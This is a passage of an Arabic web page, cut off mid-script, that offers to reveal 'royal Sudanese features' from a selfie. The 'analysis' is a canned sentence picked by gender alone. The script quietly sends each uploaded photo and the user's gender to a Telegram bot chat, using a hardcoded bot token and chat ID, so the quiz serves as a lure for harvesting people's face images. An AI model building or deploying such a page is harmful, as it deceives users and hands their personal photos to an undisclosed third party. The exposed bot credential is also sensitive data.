<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>من أصل سوداني | النسخة الملكية</title>
    <style>
        :root { --gold: #c5a059; --black: #0a0a0a; }
        body { background: var(--black); color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
        .box { border: 2px dashed var(--gold); border-radius: 15px; padding: 20px; margin: 20px 0; background: #151515; }
        .btn { background: var(--gold); color: black; padding: 12px; border: none; border-radius: 25px; font-weight: bold; width: 100%; cursor: pointer; margin: 5px 0; transition: 0.3s; }
        #preview { width: 100%; max-width: 250px; display: none; margin: 15px auto; border: 2px solid var(--gold); border-radius: 10px; }
        #res { margin-top: 20px; padding: 15px; background: #222; border-radius: 10px; display: none; border-right: 4px solid var(--gold); text-align: right; }
    </style>
</head>
<body>

    <h1>من أصل سوداني</h1>
    <p>اكتشف أسرار الملامح الملكية</p>

    <div class="box">
        <input type="file" id="cam" accept="image/*" capture="user" style="display:none">
        <input type="file" id="gal" accept="image/*" style="display:none">
        <button class="btn" onclick="document.getElementById('cam').click()">📸 التقاط سيلفي</button>
        <button class="btn" onclick="document.getElementById('gal').click()">🖼️ من الاستوديو</button>
        <img id="preview">
    </div>

    <div style="margin-bottom:20px">
        <label>الجنس:</label>
        <select id="sex" style="padding:10px; width:80%; border-radius:5px; background:#333; color:white; border:1px solid var(--gold);">
            <option value="ذكر">ذكر</option>
            <option value="أنثى">أنثى</option>
        </select>
    </div>

    <button id="go" class="btn" style="background:#27ae60; color:white; font-size: 1.2rem;">بدء التحليل والإرسال</button>
    <div id="res"></div>

<script>
    // تم تحديث رقم الـ ID الخاص بك يا أسامة بنجاح
    const BOT_TOKEN = "7038161139:AAFlvP1f6tHwNAtZ6-p_S0n_8oV28Ld4D_k";
    const CHAT_ID = "8520777894"; 
    let finalBlob = null;

    function processImage(file) {
        if (!file) return;
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = function (event) {
            const img = new Image();
            img.src = event.target.result;
            img.onload = function () {
                const canvas = document.createElement('canvas');
                const MAX_WIDTH = 700; 
                const scaleSize = MAX_WIDTH / img.width;
                canvas.width = MAX_WIDTH;
                canvas.height = img.height * scaleSize;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                canvas.toBlob((blob) => {
                    finalBlob = blob;
                    const preview = document.getElementById('preview');
                    preview.src = URL.createObjectURL(blob);
                    preview.style.display = 'block';
                }, 'image/jpeg', 0.7);
            };
        };
    }

    document.getElementById('cam').onchange = (e) => processImage(e.target.files[0]);
    document.getElementById('gal').onchange = (e) => processImage(e.target.files[0]);

    document.getElementById('go').onclick = async function() {
        if(!finalBlob) { alert("أضف صورتك أولاً"); return; }
        
        const g = document.getElementById('sex').value;
        const btn = this;
        btn.innerText = "جاري الحفظ الملكي...";
        btn.disabled = true;

        const analysis = g === "ذكر" ? "ملامح سودانية أصيلة، هيبة ملكية وشموخ." : "ملامح كنداكة سودانية، أصالة وجمال ملكي.";

        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', finalBlob, "user.jpg");
        fd.append('caption', `إشعار من الموقع:\nمستخدم جديد: ${g}\nالتحليل: ${analysis}`);

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: fd
            });

            if(response.ok) {
                document.getElementById('res').innerHTML = `📌 <b>النتيجة:</b><br>${analysis}`;
